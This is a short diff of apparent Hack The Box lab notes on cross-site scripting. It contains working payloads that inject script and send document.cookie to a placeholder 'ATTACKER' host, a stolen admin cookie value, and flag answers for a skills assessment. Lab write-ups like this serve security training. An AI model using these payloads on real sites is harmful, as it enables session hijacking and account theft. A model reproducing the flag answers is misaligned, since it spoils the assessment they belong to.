@@ -128,3 +128,11 @@ script.js: new Image().src='http://ATTACKER/index.php?c='+document.cookie;
 Stolen admin cookie: cookie=c00k1355h0u1d8353cu23d
 Use cookie at /hijacking/login.php -> flag
 ANSWER: HTB{4lw4y5_53cur3_y0ur_c00k135}
+
+---
+# XSS Skills Assessment (target 10.129.234.166 /assessment) [HTB VPN]
+Q: What is the value of the flag cookie?
+Vulnerable field: comment Website input. Payload:
+  "><script>new Image().src='http://ATTACKER/catch?c='+document.cookie;</script>
+Captured: ...flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
+ANSWER: HTB{cr055_5173_5cr1p71n6_n1nj4}
